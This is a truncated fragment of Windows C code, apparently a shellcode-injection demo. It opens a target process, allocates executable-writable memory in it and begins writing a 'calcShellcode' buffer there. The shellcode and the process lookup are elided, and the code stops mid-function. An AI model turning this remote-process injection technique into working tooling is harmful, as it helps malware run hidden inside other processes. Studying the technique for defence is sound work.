...
int main(int argc, char* argv[]){
    ...
    if (hProcess == NULL){
        printf("%s OpenProcess() failed: %ld\n", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s handle to the process opened successfully\n\\---0x%p\n", k, hProcess);

    /* allocate bytes to process memory*/
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(calcShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (rBuffer == NULL) {
        printf("%s VirtualAllocEx() failed: %ld\n", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    printf("%s allocated %zu-byte with PAGE_EXECUTE_WRITE permissions\n", k, sizeof(calcShellcode));

    /* write to process memory*/
    if (!WriteProcessMemory(hProcess, rBuffer, calcShellcode, sizeof(calcShellcode), NULL)) {
        printf("%s WriteProcessMemory() failed: %ld\n", e, GetLastError());
